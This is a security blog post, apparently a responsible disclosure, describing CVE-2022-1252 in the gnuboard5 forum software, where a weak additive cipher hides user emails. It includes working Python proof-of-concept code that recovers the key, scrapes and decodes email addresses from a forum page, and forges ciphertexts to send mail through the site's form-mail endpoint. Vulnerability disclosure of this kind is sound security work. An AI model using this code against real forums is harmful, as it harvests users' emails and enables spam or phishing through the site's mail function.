<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Insecure cipher used in forum software :: 9o3&#39;s Blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="This vulnerability was found on the popular forum platform gnuboard5. A vignette cipher is used to obfuscate user&#39;s email addresses when these are sent to the front-end. Using a known-plaintext attack, the cipher key can be calculated. Leading to leaking of user data &amp; full SMTP control." />
<meta name="keywords" content="gnuboard, gnuboard5, exploit, vulnerability, bug" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="/posts/insecure-cipher-gnuboard5/" />




<link rel="stylesheet" href="/assets/style.css">

  <link rel="stylesheet" href="/assets/pink.css">






<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="/img/favicon/pink.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="https://0g.vc/" />
  
    <meta name="twitter:creator" content="BugBot4" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Insecure cipher used in forum software">
<meta property="og:description" content="This vulnerability was found on the popular forum platform gnuboard5. A vignette cipher is used to obfuscate user&#39;s email addresses when these are sent to the front-end. Using a known-plaintext attack, the cipher key can be calculated. Leading to leaking of user data &amp; full SMTP control." />
<meta property="og:url" content="/posts/insecure-cipher-gnuboard5/" />
<meta property="og:site_name" content="9o3&#39;s Blog" />

  
    <meta property="og:image" content="/img/favicon/pink.png">
  

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2022-03-28 09:00:00 &#43;0000 UTC" />












</head>
<body class="pink">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    0g.vc
  </div>
</a>

    </div>
    
      <div class="menu-trigger">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="/posts/insecure-cipher-gnuboard5/">Insecure cipher used in forum software</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2022-03-28
        
      </span>
    
    
      <span class="post-author">:: 9o3</span>
    
    
  </div>

  
  <span class="post-tags">
    
    #<a href="/tags/bug/">bug</a>&nbsp;
    
  </span>
  
  
  <img src="/posts/insecure-cipher-gnuboard5/cover.png"
    class="post-cover"
    alt="Insecure cipher used in forum software"
    title="Cover Image" />


  

  <div class="post-content"><div>
        <p>This vulnerability was found on the popular forum platform <a href="https://github.com/gnuboard/gnuboard5">gnuboard5</a>.
A vignette cipher is used to obfuscate user&rsquo;s email addresses when these are sent to the front-end.</p>
<h1 id="description">Description<a href="#description" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>A weak obfuscation algorithm in the <code>str_encrypt</code> class leads to email disclosure on forum&rsquo;s <code>/bbs/current_connect.php</code> and <code>/bbs/profile.php</code> endpoints.
And to full, unrestricted access to the webserver&rsquo;s SMTP functionality using the <code>/bbs/formmail_send.php</code> endpoint.</p>
<p>Using a known-plaintext attack, the cipher key used by the <code>str_encrypt</code> <code>encrypt</code> function can be calculated, which in turn allows a malicious actor to de-obfuscate all user email addresses.
The <code>str_encrypt</code> class looks as follows:



  <div class="collapsable-code">
    <input id="1" type="checkbox" checked />
    <label for="1">
      <span class="collapsable-code__language">php</span>
      
      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
    </label>
    <pre class="language-php" ><code>
class str_encrypt
{
var $salt;
var $lenght;

    function __construct($salt=&#39;&#39;)
    {
        if(!$salt)
            $this-&gt;salt = md5(preg_replace(&#39;/[^0-9A-Za-z]/&#39;, substr(G5_MYSQL_USER, -1), $_SERVER[&#39;SERVER_SOFTWARE&#39;].$_SERVER[&#39;DOCUMENT_ROOT&#39;]));
        else
            $this-&gt;salt = $salt;

        $this-&gt;length = strlen($this-&gt;salt);
    }

    function encrypt($str)
    {
        $length = strlen($str);
        $result = &#39;&#39;;

        for($i=0; $i&lt;$length; $i&#43;&#43;) {
            $char    = substr($str, $i, 1);
            $keychar = substr($this-&gt;salt, ($i % $this-&gt;length) - 1, 1);
            $char    = chr(ord($char) &#43; ord($keychar));
            $result .= $char;
        }

        return strtr(base64_encode($result) , &#39;&#43;/=&#39;, &#39;._-&#39;);
    }

    function decrypt($str) {
        $result = &#39;&#39;;
        $str    = base64_decode(strtr($str, &#39;._-&#39;, &#39;&#43;/=&#39;));
        $length = strlen($str);

        for($i=0; $i&lt;$length; $i&#43;&#43;) {
            $char    = substr($str, $i, 1);
            $keychar = substr($this-&gt;salt, ($i % $this-&gt;length) - 1, 1);
            $char    = chr(ord($char) - ord($keychar));
            $result .= $char;
        }

        return $result;
    }
}
</code></pre>
  </div>


This code simply takes each character of the input string and key,
gets the decimal representation of both and adds them together,
then returns the character represented by that number. To de-cipher strings, the same is done but in reverse.</p>
<h1 id="proof-of-concept">Proof of Concept<a href="#proof-of-concept" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>After collecting the ciphertext of your own email address on the <code>/bbs/current_connect.php</code> endpoint, the following python code can be used to calculate the key
:


  <div class="collapsable-code">
    <input id="2" type="checkbox"  />
    <label for="2">
      <span class="collapsable-code__language">python</span>
      
      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
    </label>
    <pre class="language-python" ><code>
def get_key(encoded,decoded):
    bytes_encoded = base64.b64decode(encoded.replace(&#39;.&#39;, &#39;&#43;&#39;).replace(&#39;_&#39;, &#39;/&#39;).replace(&#39;-&#39;, &#39;=&#39;))
    bytes_decoded = bytearray(decoded,&#34;utf-8&#34;)
    i = 0
    output = &#34;&#34;
    for b in bytes_encoded:
        output &#43;= chr(b-bytes_decoded[i])
        i &#43;= 1
    return output

print(get_key(&#34;kZKTlJWWl5iZmsLDxMXGx8fGxcSixrGZpKahmWGVoJ0-&#34;,&#34;aaaaaaaaaaaaaaaaaaaa@example.com&#34;))
</code></pre>
  </div>


The following code can then be used to decipher other email addresses of online users or users who have their profile publicly visible.
It is interesting to note that even users who have the &ldquo;Let others see my information.&rdquo; box ticked off, still have their email exposed on the <code>/bbs/current_connect.php</code> page.



  <div class="collapsable-code">
    <input id="3" type="checkbox"  />
    <label for="3">
      <span class="collapsable-code__language">python</span>
      
      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
    </label>
    <pre class="language-python" ><code>
key = get_key(&#34;kZKTlJWWl5iZmsLDxMXGx8fGxcSixrGZpKahmWGVoJ0-&#34;,&#34;aaaaaaaaaaaaaaaaaaaa@example.com&#34;)
def decode_email(encoded):
    encoded = encoded.replace(&#39;.&#39;, &#39;&#43;&#39;).replace(&#39;_&#39;, &#39;/&#39;).replace(&#39;-&#39;, &#39;=&#39;)
    encoded_bytes = base64.b64decode(encoded)
    output = &#34;&#34;
    i = 0
    for b in encoded_bytes:
        output &#43;= chr(b - ord(key[i]))
        i &#43;= 1
        if i == len(key):
            i = 0
    return output

r = requests.get(&#34;https://forum.example/bbs/current_connect.php&#34;)
matches = re.findall(r&#34;formmail\.php\?mb_id=(.*?)&amp;amp;name=(.*?)&amp;amp;email=(.*?)\&#34;&#34;, r.text)
matches = list(set(matches))#remove duplicates

for match in matches:
	id = match[0]
	name = unquote(match[1])
	email = decode_email(match[2])
	print(&#34;{} : {} : {}&#34;.format(id,name,email))
</code></pre>
  </div>

</p>
<p>Alternatively, the following code can be used to create a ciphertext of any email address.



  <div class="collapsable-code">
    <input id="4" type="checkbox"  />
    <label for="4">
      <span class="collapsable-code__language">python</span>
      
      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
    </label>
    <pre class="language-python" ><code>
def encode_email(email):
    output_arr = []
    i = 0
    for ch in email:  
        output_arr.append(ord(ch)&#43;ord(key[i]))
        i &#43;= 1
        if i == len(key):
            i = 0
    output = str(base64.b64encode(bytearray(output_arr)))
    return output.replace(&#39;&#43;&#39;, &#39;.&#39;).replace(&#39;/&#39;, &#39;_&#39;).replace(&#39;=&#39;, &#39;-&#39;)
</code></pre>
  </div>


Which can then be used to send an email to it by making a POST request to the <code>/bbs/formmail_send.php</code> endpoint
with the following data:</p>
<pre tabindex="0"><code>to: encoded-email
attach: 2
fnick: from-username
fmail: from-mail
subject: subject
type: 0
content: mail body
file1: (binary)
file2: (binary)
captcha_key: captcha answer

</code></pre><h1 id="disclosure-timeline">Disclosure timeline<a href="#disclosure-timeline" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<ul>
<li>25/12/2021 - Initial discovery</li>
<li>28/12/2021 - Reported to maintainer at <a href="https://huntr.dev/bounties/c8c2c3e1-67d0-4a11-a4d4-11af567a9ebb/">huntr.dev</a></li>
<li>17/03/2022 - Maintainer was unable to reproduce the issue on a non-default installation</li>
<li>19/03/2022 - I was still able to reproduce the issue on a default installation, and updated the report to reflect this</li>
<li>28/03/2022 - Blog post published</li>
</ul>
<hr>
<p>This vulnerability has been assigned <strong><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-1252">CVE-2022-1252</a></strong>.</p>
<hr>
<h1 id="conclusion">Conclusion<a href="#conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>As the age-old mantra goes; don&rsquo;t roll your own crypto. In this case no cryptography was even used, 
despite what the function&rsquo;s name might imply.</p>

      </div></div>

  
  
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        
        <span class="button next">
            <a href="/posts/bullet-force-sql-injection/">
                <span class="button__text">Bullet Force SQL Injection</span>
                <span class="button__icon">â</span>
            </a>
        </span>
        
    </div>
</div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">
        <span><a href="https://twitter.com/bugbot4">0g.vc</a></span>
    
        <span>:: Theme by <a href="https://twitter.com/panr" rel="nofollow">panr</a></span>
      </div>
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>







  
</div>

</body>
</html>
